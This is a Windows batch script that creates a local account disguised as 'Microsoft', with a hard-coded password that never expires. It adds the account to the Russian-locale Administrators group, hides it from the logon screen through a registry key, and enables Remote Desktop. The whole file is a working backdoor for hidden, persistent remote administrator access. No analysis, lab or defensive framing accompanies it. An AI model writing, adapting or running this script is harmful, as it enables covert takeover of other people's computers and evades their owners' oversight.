chcp 65001
set NEW_USER=Microsoft
set NEW_PASS=Samsung1!

net user %NEW_USER% "%NEW_PASS%" /add
wmic path Win32_UserAccount where Name="%NEW_USER%" set PasswordExpires=false
 net user %NEW_USER% passwordchg:no
 net localgroup "Администраторы" %NEW_USER% /add
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayLastName /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %NEW_USER% /t reg_dword /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

pause